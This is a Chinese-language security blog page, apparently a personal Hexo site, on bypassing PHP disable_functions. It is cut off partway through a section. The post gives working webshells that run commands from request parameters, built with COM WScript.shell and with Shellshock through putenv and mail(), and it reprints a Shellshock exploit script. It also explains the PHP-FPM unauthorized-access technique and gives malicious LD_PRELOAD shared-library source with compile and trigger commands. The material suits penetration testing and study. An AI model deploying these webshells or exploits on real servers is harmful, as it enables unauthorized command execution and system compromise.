<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/page/8/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
<meta name="generator" content="Hexo 5.4.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-bypass_disable_function_open_basedir" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/10/01/bypass_disable_function_open_basedir/" class="article-date">
  <time class="dt-published" datetime="2021-10-01T15:35:42.672Z" itemprop="datePublished">2021-10-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/web/">web</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/10/01/bypass_disable_function_open_basedir/">bypass_disable_function_open_basedir</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="bypass-disable-function"><a href="#bypass-disable-function" class="headerlink" title="bypass disable_function"></a>bypass disable_function</h1><h2 id="危险函数-类"><a href="#危险函数-类" class="headerlink" title="危险函数/类"></a>危险函数/类</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">FFI</span><br><span class="line">COM</span><br><span class="line">exec</span><br><span class="line">assert</span><br><span class="line">eval</span><br><span class="line">system</span><br><span class="line">ini_set/ini_alter</span><br><span class="line">putenv</span><br><span class="line">imap_open</span><br><span class="line">pcntl_exec</span><br><span class="line">win_shell_execute</span><br><span class="line">dl</span><br></pre></td></tr></table></figure>



<h2 id="利用Windows系统组件COM绕过"><a href="#利用Windows系统组件COM绕过" class="headerlink" title="利用Windows系统组件COM绕过"></a>利用Windows系统组件COM绕过</h2><p>利用条件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">extension=php_com_dotnet.dll</span><br><span class="line">com.allow_dcom = true</span><br><span class="line">wshom.ocx 存在</span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$command</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$wsh</span> = <span class="keyword">new</span> COM(<span class="string">&#x27;WScript.shell&#x27;</span>); <span class="comment">// 生成一个COM对象　Shell.Application也能</span></span><br><span class="line"><span class="variable">$exec</span> = <span class="variable">$wsh</span>-&gt;exec(<span class="string">&quot;cmd /c&quot;</span>.<span class="variable">$command</span>); <span class="comment">//调用对象方法来执行命令</span></span><br><span class="line"><span class="variable">$stdout</span> = <span class="variable">$exec</span>-&gt;StdOut();</span><br><span class="line"><span class="variable">$stroutput</span> = <span class="variable">$stdout</span>-&gt;ReadAll();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$stroutput</span>;</span><br></pre></td></tr></table></figure>





<h2 id="GNU-Bash-环境变量远程命令执行漏洞-CVE-2014-6271"><a href="#GNU-Bash-环境变量远程命令执行漏洞-CVE-2014-6271" class="headerlink" title="GNU Bash 环境变量远程命令执行漏洞 CVE-2014-6271"></a>GNU Bash 环境变量远程命令执行漏洞 CVE-2014-6271</h2><blockquote>
<p>   被攻击的bash存在漏洞（版本小于等于4.3）<br>   攻击者可以控制环境变量<br>   新的bash进程被打开触发漏洞并执行命令</p>
</blockquote>
<p>利用php的mail函数:<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/35146">https://www.exploit-db.com/exploits/35146</a> </p>
<p><a target="_blank" rel="noopener" href="https://www.antiy.com/response/CVE-2014-6271.html">https://www.antiy.com/response/CVE-2014-6271.html</a></p>
<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a><strong>漏洞原理</strong></h3><p>4.3及之前的bash启动解析环境变量时未对边界进行严格的限制</p>
<p>“(){”开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令。核心的原因在于在输入的过滤中没有严格限制边界，没有做合法化的参数判断。</p>
<p>bash函数的格式,调用函数只需变量名+参数即可<code>函数 参数1 参数2</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">funtion ShellShock </span><br><span class="line">&#123; <span class="built_in">echo</span> <span class="string">&quot;Injection&quot;</span>&#125; ShellShock   <span class="comment">#调用这个函数</span></span><br></pre></td></tr></table></figure>

<p>这个时候的Bash的环境变量：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">KEY = ShellShockVALUE = () &#123; echo Injection; &#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>来看看ShellShock漏洞的真身：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export ShellShock=&#x27;() &#123; :; &#125;; echo;/usr/bin/whoami&#x27;</span><br><span class="line"><span class="meta">bash&gt;</span><span class="bash">Kr0iN</span></span><br></pre></td></tr></table></figure>

<p>看看环境变量你有什么<br><img src="https://i.loli.net/2019/09/11/nhgdTelRLotsjym.png" alt="image1229"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">env x=<span class="string">&#x27;() &#123; :;&#125;; echo Vulnerable CVE-2014-6271 &#x27;</span> bash -c <span class="string">&quot;echo test&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2019/09/11/nhgdTelRLotsjym.png" alt="image1379"></p>
<h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><h4 id="php的mail函数"><a href="#php的mail函数" class="headerlink" title="php的mail函数()"></a>php的mail函数()</h4><p>如果服务器的默认sh是bash,mail函数会生成一个bash进程,再结合putenv()利用破壳漏洞来实现任意命令执行</p>
<p>会生成bash进程除了mail,php函数还有imap_mail，如果你仅仅通过禁用mail函数来规避这个安全问题，那么imap_mail是可以做替代的。当然，php里还可能有其他地方有调用popen或其他能够派生bash子进程的函数，通过这些地方，都可以通过破壳漏洞执行命令的。</p>
<p>更详细的解释:p牛的<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PHP/php-bypass-disable-functions-by-CVE-2014-6271.html">PHP Execute Command Bypass Disable_functions</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions)</span></span><br><span class="line"><span class="comment"># Google Dork: none</span></span><br><span class="line"><span class="comment"># Date: 10/31/2014</span></span><br><span class="line"><span class="comment"># Exploit Author: Ryan King (Starfall)</span></span><br><span class="line"><span class="comment"># Vendor Homepage: http://php.net</span></span><br><span class="line"><span class="comment"># Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror</span></span><br><span class="line"><span class="comment"># Version: 5.* (tested on 5.6.2)</span></span><br><span class="line"><span class="comment"># Tested on: Debian 7 and CentOS 5 and 6</span></span><br><span class="line"><span class="comment"># CVE: CVE-2014-6271</span></span><br><span class="line">&lt;pre&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">&quot;Disabled functions: &quot;</span>.ini_get(<span class="string">&#x27;disable_functions&#x27;</span>).<span class="string">&quot;\n&quot;</span>; <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shellshock</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123; <span class="comment">// Execute a command via CVE-2014-6271 @ mail.c:283</span></span><br><span class="line">   <span class="keyword">if</span>(strstr(readlink(<span class="string">&quot;/bin/sh&quot;</span>), <span class="string">&quot;bash&quot;</span>) != <span class="literal">FALSE</span>) &#123;</span><br><span class="line">     <span class="variable">$tmp</span> = tempnam(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;data&quot;</span>);</span><br><span class="line">     putenv(<span class="string">&quot;PHP_LOL=() &#123; x; &#125;; <span class="subst">$cmd</span> &gt;<span class="subst">$tmp</span> 2&gt;&amp;1&quot;</span>);</span><br><span class="line">     <span class="comment">// In Safe Mode, the user may only alter environment variables whose names</span></span><br><span class="line">     <span class="comment">// begin with the prefixes supplied by this directive.</span></span><br><span class="line">     <span class="comment">// By default, users will only be able to set environment variables that</span></span><br><span class="line">     <span class="comment">// begin with PHP_ (e.g. PHP_FOO=BAR). <span class="doctag">Note:</span> if this directive is empty,</span></span><br><span class="line">     <span class="comment">// PHP will let the user modify ANY environment variable!</span></span><br><span class="line">     mail(<span class="string">&quot;a@127.0.0.1&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;-bv&quot;</span>); <span class="comment">// -bv so we don&#x27;t actually send any mail</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span> <span class="keyword">return</span> <span class="string">&quot;Not vuln (not bash)&quot;</span>;</span><br><span class="line">   <span class="variable">$output</span> = @file_get_contents(<span class="variable">$tmp</span>);</span><br><span class="line">   @unlink(<span class="variable">$tmp</span>);</span><br><span class="line">   <span class="keyword">if</span>(<span class="variable">$output</span> != <span class="string">&quot;&quot;</span>) <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">   <span class="keyword">else</span> <span class="keyword">return</span> <span class="string">&quot;No output, or not vuln.&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> shellshock(<span class="variable">$_REQUEST</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>





<h2 id="利用php-fpm未授权访问漏洞"><a href="#利用php-fpm未授权访问漏洞" class="headerlink" title="利用php-fpm未授权访问漏洞"></a>利用php-fpm未授权访问漏洞</h2><h3 id="推荐文章"><a href="#推荐文章" class="headerlink" title="推荐文章"></a>推荐文章</h3><p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">Fastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5598">浅析php-fpm的攻击方式</a></p>
<h3 id="什么是php-fpm"><a href="#什么是php-fpm" class="headerlink" title="什么是php-fpm"></a>什么是php-fpm</h3><p>php-fpm是php官方的fastcgi解析器,Nginx等服务器中间件将用户请求按照fastcgi的规则打包好通过TCP传给谁？其实就是传给FPM。FPM按照fastcgi的协议将TCP流解析成真正的数据。</p>
<p>说到fastcgi,就必须先讲一下cgi</p>
<p>cgi的历史:</p>
<blockquote>
<p>早期的webserver只处理html等静态文件，但是随着技术的发展，出现了像php等动态语言。<br>webserver处理不了了，怎么办呢？那就交给php解释器来处理吧！<br>交给php解释器处理很好，但是，php解释器如何与webserver进行通信呢？<br>为了解决不同的语言解释器(如php、python解释器)与webserver的通信，于是出现了cgi协议。只要你按照cgi协议去编写程序，就能实现语言解释器与webwerver的通信。如php-cgi程序。</p>
</blockquote>
<p>Fast-CGI:</p>
<p>虽然cgi解决php解释器与webserver的通信问题，但是webserver每收到一个请求就会去fork一个cgi进程,请求结束再kill掉这个进程,这样会很浪费资源,于是出现了cgi的改良版本。</p>
<blockquote>
<p>fast-cgi每次处理完请求后，不会kill掉这个进程，而是保留这个进程，使这个进程可以一次处理多个请求。这样每次就不用重新fork一个进程了，大大提高了效率。</p>
</blockquote>
<p>php-fpm 是一个Fastcgi的实现,并提供进程管理功能。</p>
<p>进程包含了master进程和worker进程</p>
<p>master进程只有一个,负责监听端口(一般是9000)接收来自Web Server的请求,而worker进程则一般有多个(具体数量根据实际需要配置),每个进程内部都嵌入了一个php解释器,是php代码真正执行的地方。</p>
<p>[<img src="https://xzfile.aliyuncs.com/media/upload/picture/20190709100809-65db4fc6-a1ee-1.jpg" alt="image4092"></p>
<p>上面第一个是主进程,下面两个是worker进程。</p>
<h3 id="服务器利用fastcgi的通信过程"><a href="#服务器利用fastcgi的通信过程" class="headerlink" title="服务器利用fastcgi的通信过程"></a>服务器利用fastcgi的通信过程</h3><p>Fastcgi其实是一个通信协议，和HTTP协议一样，都是进行数据交换的一个通道。</p>
<p>fastcgi协议则是服务器中间件和某个语言后端进行数据交换的协议。</p>
<p>类比HTTP协议来说，fastcgi协议则是服务器中间件和某个语言后端进行数据交换的协议。Fastcgi协议由多个record组成，record也有header和body一说，服务器中间件将这二者按照fastcgi的规则封装好发送给语言后端，语言后端解码以后拿到具体数据，进行指定操作，并将结果再按照该协议封装好后返回给服务器中间件。</p>
<p>record具有固定的结构。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="comment">/* Header */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> version; <span class="comment">// 版本</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> type; <span class="comment">// 本次record的类型</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> requestIdB1; <span class="comment">// 本次record对应的请求id</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> requestIdB0;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> contentLengthB1; <span class="comment">// body体的大小</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> contentLengthB0;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> paddingLength; <span class="comment">// 额外块大小</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> reserved; </span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Body */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> contentData[contentLength];</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> paddingData[paddingLength];</span><br><span class="line">&#125; FCGI_Record;</span><br></pre></td></tr></table></figure>

<p>而其中的<code>type</code>就是指定该record的作用。因为fastcgi一个record的大小是有限的，作用也是单一的，所以我们需要在一个TCP流里传输多个record。通过<code>type</code>来标志每个record的作用，用<code>requestId</code>作为同一次请求的id。</p>
<p>也就是说，每次请求，会有多个record，他们的<code>requestId</code>是相同的。</p>
<p>借用<a target="_blank" rel="noopener" href="http://blog.csdn.net/shreck66/article/details/50355729">该文章</a>中的一个表格，列出最主要的几种<code>type</code>：</p>
<p><img src="https://i.loli.net/2019/09/10/4CbPDvp6XlAkWiI.png" alt="image5295"></p>
<p>根据这个表格我们可以猜测，服务器中间件和后端语言通信，第一个数据包就是<code>type</code>为1的record，后续互相交流，发送<code>type</code>为4、5、6、7的record，结束时发送<code>type</code>为2、3的record。</p>
<p>我们要关注的重点就是type=4的部分,也就是是设置环境变量的地方。</p>
<p>php里有很多有趣的设置,像文件包含里常用的php设置<code>auto_prepared_file,auto_append_file</code></p>
<p>我们令<code>auto_prepared_file=php://input</code>且<code>allow_url_include=On</code></p>
<p>那么我们该如何利用fastcgi来设置php的环境变量</p>
<p>这又涉及到PHP-FPM的两个环境变量，<code>PHP_VALUE</code>和<code>PHP_ADMIN_VALUE</code>。这两个环境变量就是用来设置PHP配置项的，<code>PHP_VALUE</code>可以设置模式为<code>PHP_INI_USER</code>和<code>PHP_INI_ALL</code>的选项，<code>PHP_ADMIN_VALUE</code>可以设置所有选项。（<code>disable_functions</code>除外，这个选项是PHP加载的时候就确定了，在范围内的函数直接不会被加载到PHP上下文中）</p>
<p>结构体实例:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(</span><br><span class="line">		<span class="string">&#x27;GATEWAY_INTERFACE&#x27;</span> =&gt; <span class="string">&#x27;FastCGI/1.0&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;REQUEST_METHOD&#x27;</span> =&gt; <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;SCRIPT_FILENAME&#x27;</span> =&gt; <span class="string">&#x27;/var/www/html/index.php&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;SERVER_SOFTWARE&#x27;</span> =&gt; <span class="string">&#x27;php/fcgiclient&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;REMOTE_ADDR&#x27;</span> =&gt; <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;REMOTE_PORT&#x27;</span> =&gt; <span class="string">&#x27;9985&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;SERVER_ADDR&#x27;</span> =&gt; <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;SERVER_PORT&#x27;</span> =&gt; <span class="string">&#x27;80&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;SERVER_NAME&#x27;</span> =&gt; <span class="string">&#x27;mag-tured&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;SERVER_PROTOCOL&#x27;</span> =&gt; <span class="string">&#x27;HTTP/1.1&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;CONTENT_TYPE&#x27;</span> =&gt; <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;CONTENT_LENGTH&#x27;</span> =&gt; strlen(<span class="variable">$content</span>),</span><br><span class="line">        <span class="string">&#x27;PHP_VALUE&#x27;</span> =&gt;<span class="string">&#x27;auto_append_file=php://input&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;PHP_ADMIN_VALUE&#x27;</span>=&gt;<span class="string">&#x27;allow_url_include=On&#x27;</span></span><br><span class="line">	)</span><br></pre></td></tr></table></figure>



<h3 id="原理浅析"><a href="#原理浅析" class="headerlink" title="原理浅析"></a>原理浅析</h3><p>这个原理的漏洞原因是PHP-FPM未授权访问漏洞,php-fpm没有对发送数据的来源进行验证,导致只要我们向php-fpm发送符合格式的数据就可以被解析.再结合fastcgi设置环境变量的部分来达到getshell</p>
<h3 id="fpm利用脚本"><a href="#fpm利用脚本" class="headerlink" title="fpm利用脚本"></a>fpm利用脚本</h3><p>分享个p牛脚本里面的一个client客户端: <a target="_blank" rel="noopener" href="https://github.com/wuyunfeng/Python-FastCGI-Client">Python FastCGI Client</a><br>还有Lz1y师傅给的一个php客户端 <a target="_blank" rel="noopener" href="https://github.com/adoy/PHP-FastCGI-Client.git">PHP FastCGI Client</a></p>
<p>还要php语言客户端: <a target="_blank" rel="noopener" href="http://nullget.sourceforge.net/?q=node/795&lang=zh-hans">fastcgi客户端PHP语言实现</a></p>
<h2 id="LD-PRELOAD绕过"><a href="#LD-PRELOAD绕过" class="headerlink" title="LD_PRELOAD绕过"></a>LD_PRELOAD绕过</h2><h3 id="send-mail"><a href="#send-mail" class="headerlink" title="send_mail"></a>send_mail</h3><p>这里我们先来看一下原理，首先什么是LD_PRELOAD？</p>
<p>google给出如下定义</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LD_PRELOAD is an optional environmental variable containing one or more paths to shared libraries, or shared objects, that the loader will load before any other shared library including the C runtime library (libc.so) This is called preloading a library.</span><br></pre></td></tr></table></figure>

<p>即LD_PRELOAD这个环境变量指定路径的文件，会在其他文件被调用前，最先被调用</p>
<p>而putenv可以设置环境变量</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">putenv ( <span class="keyword">string</span> <span class="variable">$setting</span> ) : <span class="keyword">bool</span></span><br></pre></td></tr></table></figure>

<p>添加 setting 到服务器环境变量。 环境变量仅存活于当前请求期间。 在请求结束时环境会恢复到初始状态。</p>
<p>那么我们可以进行一下骚操作</p>
<blockquote>
<p>1.制作一个恶意shared libraries<br>2.使用putenv设置LD_PRELOAD为恶意文件路径<br>3.使用某个php函数，触发specific shared library</p>
</blockquote>
<h4 id="利用函数"><a href="#利用函数" class="headerlink" title="利用函数"></a>利用函数</h4><p><code>putenv,errorlog,mail</code></p>
<h4 id="如何制作shared-libraries"><a href="#如何制作shared-libraries" class="headerlink" title="如何制作shared libraries"></a>如何制作shared libraries</h4><p>选择要替换的函数我们这里选取geteuid()</p>
<p>理由是php的mail()函数会调用系统的sendmail命令而sendmail命令会调用getuid()这个函数,所以我们确定目标为geteuid函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	system(<span class="string">&quot;ls &gt; result.txt&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span>  <span class="title">geteuid</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getenv(<span class="string">&quot;LD_PRELOAD&quot;</span>) == <span class="literal">NULL</span>) </span><br><span class="line">    &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">    unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    payload();</span><br><span class="line">  	&#125;</span><br></pre></td></tr></table></figure>

<p>当这个共享库中的 <code>geteuid</code> 被调用时，尝试加载 <code>payload()</code> 函数，执行命令。这个测试函数写的很简单，实际应用时可相应调整完善。在攻击机上（注意编译平台应和靶机平台相近，至少不能一个是 32 位一个是 64 位）把它编译为一个位置信息无关的动态共享库：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c -fPIC hack.c -o hack</span><br><span class="line">gcc -shared hack -o hack.so</span><br></pre></td></tr></table></figure>

<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>将恶意的.so文件上传到服务器</p>
<p>执行如下代码,即可载入恶意命令</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">putenv(<span class="string">&quot;LD_PRELOAD=/var/www/hack.so&quot;</span>);</span><br><span class="line">mail(<span class="string">&quot;[email protected]&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="相关文章"><a href="#相关文章" class="headerlink" title="相关文章"></a>相关文章</h4><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/175403">https://www.anquanke.com/post/id/175403</a></p>
<p><a target="_blank" rel="noopener" href="https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html">https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html</a></p>
<p>[<a target="_blank" rel="noopener" href="https://www.k0rz3n.com/2019/02/12/PHP%20%E4%B8%AD%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E7%9A%84%E5%8D%B1%E9%99%A9%E7%9A%84%E5%87%BD%E6%95%B0/#8-mail-%E7%AC%AC%E4%BA%94%E4%B8%AA%E5%8F%82%E6%95%B0-excrt-cmd]">https://www.k0rz3n.com/2019/02/12/PHP%20%E4%B8%AD%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E7%9A%84%E5%8D%B1%E9%99%A9%E7%9A%84%E5%87%BD%E6%95%B0/#8-mail-%E7%AC%AC%E4%BA%94%E4%B8%AA%E5%8F%82%E6%95%B0-excrt-cmd]</a>(<a target="_blank" rel="noopener" href="https://www.k0rz3n.com/2019/02/12/PHP">https://www.k0rz3n.com/2019/02/12/PHP</a> 中可以利用的危险的函数/#8-mail-第五个参数-excrt-cmd)</p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/169156.html">https://www.freebuf.com/articles/web/169156.html</a></p>
<h3 id="without-sendmail"><a href="#without-sendmail" class="headerlink" title="without sendmail"></a>without sendmail</h3><p> <a target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2019/06/02/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-disable-functions%E7%9A%84%E6%96%B9%E6%B3%95/#Method2%E2%80%94%E2%80%94%E5%8A%AB%E6%8C%81%E5%90%AF%E5%8A%A8%E8%BF%9B%E7%A8%8B">参考链接</a> </p>
<blockquote>
<p>回到 LD_PRELOAD 本身，系统通过它预先加载共享对象，如果能找到一个方式，在加载时就执行代码，而不用考虑劫持某一系统函数，那我就完全可以不依赖 sendmail 了。这种场景与 C++ 的构造函数简直神似！</p>
<p>GCC 有个 C 语言扩展修饰符 <code>__attribute__((constructor))</code>，可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行 <code>__attribute__((constructor))</code> 修饰的函数。这一细节非常重要，很多朋友用 LD_PRELOAD 手法突破 disable_functions 无法做到百分百成功，正因为这个原因，<strong>不要局限于仅劫持某一函数，而应考虑拦劫启动进程这一行为</strong>。</p>
